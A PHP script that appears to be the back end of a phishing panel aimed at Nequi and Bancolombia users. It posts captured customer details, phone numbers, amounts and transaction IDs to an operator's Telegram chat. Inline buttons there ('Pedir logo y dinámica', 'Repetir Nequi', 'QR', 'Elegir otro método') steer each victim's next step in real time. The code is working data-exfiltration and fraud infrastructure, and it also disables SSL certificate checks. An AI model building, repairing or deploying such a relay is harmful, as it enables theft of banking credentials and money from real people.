<?php
ini_set('display_errors', 0);
error_reporting(0);
header('Content-Type: application/json');

/* ============================================================
   ARCHIVOS
   ============================================================ */
$USED_TOKENS_FILE = __DIR__ . '/used_tokens.json';

/* ============================================================
   CARGAR CONFIG
   ============================================================ */
function loadConfig()
{
    $file = __DIR__ . '/../config.php';
    if (!file_exists($file)) return null;

    $config = require $file;
    if (empty($config['bot_token']) || empty($config['chat_id'])) return null;

    return [
        'token'   => $config['bot_token'],
        'chat_id'=> $config['chat_id']
    ];
}

/* ============================================================
   TELEGRAM: SEND MESSAGE (CORREGIDO)
   ============================================================ */
function sendMessage($token, $chatId, $text, $keyboard)
{
    // ✅ CORRECCIÓN 1: reply_markup debe ser array, NO json_encode()
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => ['inline_keyboard' => $keyboard]
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   TELEGRAM: EDIT MESSAGE
   ============================================================ */
function editMessage($token, $chatId, $messageId, $text)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => ['inline_keyboard' => []]
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   PERSISTENCIA: Guardar última acción
   ============================================================ */
function saveLastAction($tid, $action, $updateId, $user)
{
    $file = __DIR__ . '/.last_action';
    $data = [
        'transactionId' => $tid,
        'lastAction' => $action,
        'lastUpdateId' => $updateId,
        'processedBy' => $user,
        'timestamp' => date('Y-m-d H:i:s'),
        'unix_timestamp' => time()
    ];
    
    if (!file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT))) {
        error_log("Error guardando .last_action para $tid");
    }
}

/* ============================================================
   KEYBOARD
   ============================================================ */
function buildKeyboard($tid)
{
    return [
        [['text' => '🧠🖼 Pedir logo y dinámica', 'callback_data' => "dinamica_logo:{$tid}"]],
        [['text' => '✅ Pago enviado', 'callback_data' => "enviado:{$tid}"]],
        [['text' => '🔁 Repetir Nequi', 'callback_data' => "repetir:{$tid}"]],
        [['text' => '📲 QR', 'callback_data' => "qr:{$tid}"]],
        [['text' => '🔄 Elegir otro método', 'callback_data' => "otro:{$tid}"]],
        [['text' => '🏁 Finalizar', 'callback_data' => "fin:{$tid}"]]
    ];
}

/* ============================================================
   MENSAJE
   ============================================================ */
function formatMessage($d)
{
    $b = $d['bancoldata'] ?? [];
    $monto = number_format((float)($d['total'] ?? 0), 0, ',', '.');

    $msg = "<b>🧾 Información del Cliente</b>\n\n";
    if (!empty($d['tbdatos']) && is_array($d['tbdatos'])) {
        foreach ($d['tbdatos'] as $k => $v) {
            $msg .= "• " . ucfirst(str_replace('_', ' ', $k)) . ": <code>$v</code>\n";
        }
    }

    $msg .= "\n<b>💸 Pago Nequi</b>\n";
    $msg .= "• 🆔 Transaction ID: <code>{$d['transactionId']}</code>\n";
    $msg .= "• 📱 Número: <code>" . ($b['usuario'] ?? 'N/D') . "</code>\n";
    $msg .= "• 💰 Monto: <b>$ {$monto}</b>";

    return $msg;
}

/* ============================================================
   TOKENS
   ============================================================ */
function isTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    if (!file_exists($USED_TOKENS_FILE)) return false;
    $tokens = json_decode(file_get_contents($USED_TOKENS_FILE), true);
    return isset($tokens[$id]);
}

function markTokenUsed($id)
{
    global $USED_TOKENS_FILE;
    $tokens = file_exists($USED_TOKENS_FILE)
        ? json_decode(file_get_contents($USED_TOKENS_FILE), true)
        : [];
    $tokens[$id] = time();
    file_put_contents($USED_TOKENS_FILE, json_encode($tokens));
}

/* ============================================================
   VALIDACIÓN DE TRANSACTIONID
   ============================================================ */
function isValidTransactionId($tid)
{
    // ✅ CORRECCIÓN 2: Validar que tid no esté vacío
    return !empty($tid) && is_string($tid) && strlen($tid) > 0;
}

/* ============================================================
   CONFIG
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => 'Config not found']);
    exit;
}

/* ============================================================
   POST → ENVÍO INICIAL
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $d = json_decode(file_get_contents('php://input'), true);
    $tid = $d['transactionId'] ?? '';

    // ✅ CORRECCIÓN 3: Validar tid antes de procesar
    if (!isValidTransactionId($tid) || isTokenUsed($tid)) {
        echo json_encode(['ok' => false, 'error' => 'Invalid or duplicate transaction']);
        exit;
    }

    markTokenUsed($tid);

    $msg = formatMessage($d);
    $keyboard = buildKeyboard($tid);
    $sent = sendMessage($config['token'], $config['chat_id'], $msg, $keyboard);

    echo json_encode(['ok' => !empty($sent['ok'])]);
    exit;
}

/* ============================================================
   GET → POLLING + REESCRIBE MENSAJE (CORREGIDO)
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    // ✅ CORRECCIÓN 4: Validar tid en GET también
    if (!isValidTransactionId($tid)) {
        echo json_encode(['ok' => false, 'error' => 'Invalid transaction ID']);
        exit;
    }

    // ✅ CORRECCIÓN 5: Usar hash consistente del tid
    $tempDir = __DIR__;
    $statusFile = $tempDir . '/last_update_' . md5($tid) . '.txt';
    $lastProcessedUpdateId = 0;
    if (file_exists($statusFile)) {
        $lastProcessedUpdateId = (int)file_get_contents($statusFile);
    }

    // Poll Telegram for updates starting from the offset
    $ch = curl_init("https://api.telegram.org/bot{$config['token']}/getUpdates?offset=" . ($lastProcessedUpdateId + 1) . "&timeout=5");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    if (!$response) {
        echo json_encode(['ok' => false]);
        exit;
    }

    $updates = json_decode($response, true);
    if (!isset($updates['result']) || !is_array($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $upd) {
        if (!isset($upd['callback_query'])) {
            continue;
        }

        $cb = $upd['callback_query'];
        if (!isset($cb['data'])) {
            continue;
        }

        // ✅ CORRECCIÓN 6: Validación exacta y robusta del formato
        $callbackData = $cb['data'];
        $callbackParts = explode(':', $callbackData);
        
        // Debe tener exactamente 2 partes: "action:tid"
        if (count($callbackParts) !== 2) {
            continue;
        }

        $receivedTid = $callbackParts[1];
        
        // ✅ CORRECCIÓN 7: Validar que el tid coincida EXACTAMENTE
        if ($receivedTid !== $tid) {
            continue;
        }

        $updateId = (int)$upd['update_id'];
        if ($updateId <= $lastProcessedUpdateId) {
            continue;
        }

        // Found a matching and NEW callback query!
        $action = $callbackParts[0];
        $user = $cb['from']['username']
            ?? $cb['from']['first_name']
            ?? 'desconocido';

        // ✅ CORRECCIÓN 8: Marcar update como procesado INMEDIATAMENTE
        file_put_contents($statusFile, $updateId);

        // Responder el click en Telegram para detener el spinner de carga
        $chAnswer = curl_init("https://api.telegram.org/bot{$config['token']}/answerCallbackQuery");
        curl_setopt_array($chAnswer, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode([
                'callback_query_id' => $cb['id']
            ]),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($chAnswer);
        curl_close($chAnswer);

        // Guardar acción
        saveLastAction($tid, $action, $updateId, $user);

        $msgId = $cb['message']['message_id'] ?? '';
        $original = $cb['message']['text'] ?? '';

        $newText = $original
            . "\n\n━━━━━━━━━━━━━━━━━━━━"
            . "\n✅ <b>Acción:</b> <code>" . strtoupper($action) . "</code>"
            . "\n👤 <b>Usuario:</b> @" . $user;

        $payload = [
            'chat_id' => $config['chat_id'],
            'message_id' => $msgId,
            'text' => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => ['inline_keyboard' => []]
        ];

        $chEdit = curl_init("https://api.telegram.org/bot{$config['token']}/editMessageText");
        curl_setopt_array($chEdit, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST           => true,
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
            CURLOPT_POSTFIELDS     => json_encode($payload),
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($chEdit);
        curl_close($chEdit);

        echo json_encode([
            'ok' => true,
            'action' => $action
        ]);
        exit;
    }

    echo json_encode(['ok' => false]);
    exit;
}

/* ============================================================
   DEFAULT
   ============================================================ */
echo json_encode(['ok' => false, 'error' => 'Invalid request method']);
exit;
